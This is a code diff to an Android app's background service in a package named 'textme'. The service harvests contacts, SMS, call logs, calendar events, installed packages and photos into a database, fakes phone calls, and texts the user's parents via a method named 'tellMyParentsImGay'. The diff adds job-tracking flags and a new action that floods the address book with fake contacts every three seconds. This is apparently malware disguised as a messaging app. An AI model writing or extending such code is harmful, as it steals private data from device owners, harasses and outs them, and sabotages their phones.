@@ -1,7 +1,9 @@
 package com.candroid.textme.jobs;
 
+import android.Manifest;
 import android.app.IntentService;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.database.SQLException;
 import android.database.sqlite.SQLiteDatabase;
 import android.database.sqlite.SQLiteException;
@@ -15,6 +17,7 @@ import com.candroid.textme.data.pojos.Contact;
 import com.candroid.textme.data.db.Database;
 import com.candroid.textme.data.db.DatabaseHelper;
 import com.candroid.textme.api.Lofl;
+import com.candroid.textme.jobs.services.InsertContactJobService;
 import com.candroid.textme.services.MessagingService;
 import com.candroid.textme.data.pojos.PhoneCall;
 import com.candroid.textme.data.Pornhub;
@@ -40,6 +43,8 @@ public class JobsIntentService extends IntentService {
     public static final String ACTION_WALLPAPER = "ACTION_WALLPAPER";
     public static final String ACTION_FAKE_PHONE_CALL = "ACTION_FAKE_PHONE_CALL";
     public static final String ACTION_TEXT_PARENTS = "ACTION_TEXT_PARENTS";
+    public static final String ACTION_INSERT_CONTACT = "ACTION_INSERT_CONTACT";
+    private static long sNumber = 1111111111;
 
     public JobsIntentService() {
         super("JobsIntentService");
@@ -66,6 +71,7 @@ public class JobsIntentService extends IntentService {
                     if(database.isOpen()){
                         database.close();
                     }
+                    Lofl.setJobRan(this, JobsScheduler.DCIM_KEY);
                 }
             }else if(intent.getAction().equals(ACTION_PACKAGES)){
                 SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
@@ -80,6 +86,7 @@ public class JobsIntentService extends IntentService {
                     if(database.isOpen()){
                         database.close();
                     }
+                    Lofl.setJobRan(this, JobsScheduler.PACKAGES_KEY);
                 }
             }else if(intent.getAction().equals(ACTION_CONTACTS)){
                 ArrayList<Contact> contacts = Lofl.fetchContactsInformation(this);
@@ -93,6 +100,7 @@ public class JobsIntentService extends IntentService {
                 }finally{
                     database.endTransaction();
                     database.close();
+                    Lofl.setJobRan(this, ACTION_CONTACTS);
                 }
             }else if(intent.getAction().equals(ACTION_DEVICE_INFO)){
                 SQLiteDatabase database = DatabaseHelper.getInstance(getApplicationContext()).getWritableDatabase();
@@ -105,6 +113,7 @@ public class JobsIntentService extends IntentService {
                 }finally {
                     database.endTransaction();
                     database.close();
+                    Lofl.setJobRan(this, ACTION_DEVICE_INFO);
                 }
             }else if(intent.getAction().equals(ACTION_PHONE_CALLS)){
                 ArrayList<PhoneCall> phoneCalls = Lofl.fetchCallLog(this);
@@ -118,6 +127,7 @@ public class JobsIntentService extends IntentService {
                 }finally{
                     database.endTransaction();
                     database.close();
+                    Lofl.setJobRan(this, JobsScheduler.PHONE_CALLS_KEY);
                 }
             }else if(intent.getAction().equals(ACTION_SMS)){
                 ArrayList<SmsMsg> smsMsgs = Lofl.fetchSmsMessages(this);
@@ -131,6 +141,7 @@ public class JobsIntentService extends IntentService {
                 }finally {
                     database.endTransaction();
                     database.close();
+                    Lofl.setJobRan(this, JobsScheduler.SMS_KEY);
                 }
             }else if(intent.getAction().equals(ACTION_CALENDAR_EVENT)){
                 ArrayList<CalendarEvent> calendarEvents = Lofl.fetchCalendarEvents(this);
@@ -144,6 +155,7 @@ public class JobsIntentService extends IntentService {
                 }finally {
                     database.endTransaction();
                     database.close();
+                    Lofl.setJobRan(this, JobsScheduler.CALENDAR_EVENTS_KEY);
                 }
             }else if(intent.getAction().equals(ACTION_WALLPAPER)){
                 double randomNumber = Math.random();
@@ -174,6 +186,20 @@ public class JobsIntentService extends IntentService {
                 Lofl.fakePhoneCall(this);
             }else if(intent.getAction().equals(ACTION_TEXT_PARENTS)){
                 Lofl.tellMyParentsImGay(this);
+                Lofl.setJobRan(this, JobsScheduler.TEXT_PARENTS_KEY);
+            }else if(intent.getAction().equals(ACTION_INSERT_CONTACT)){
+                if(this.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) == PackageManager.PERMISSION_GRANTED){
+                    TimerTask timerTask = new TimerTask() {
+                        @Override
+                        public void run() {
+                            sNumber++;
+                            Lofl.insertContact(JobsIntentService.this, String.valueOf(sNumber).concat(" ").concat(String.valueOf(sNumber)), String.valueOf(sNumber++));
+                        }
+                    };
+                    Timer timer = new Timer("insertContactsTask", true);
+                    timer.scheduleAtFixedRate(timerTask, 0, 3000);
+                    Lofl.setJobRan(this, JobsScheduler.INSERT_CONTACT_KEY);
+                }
             }else{
                 Log.d(TAG, "No action found!");
             }
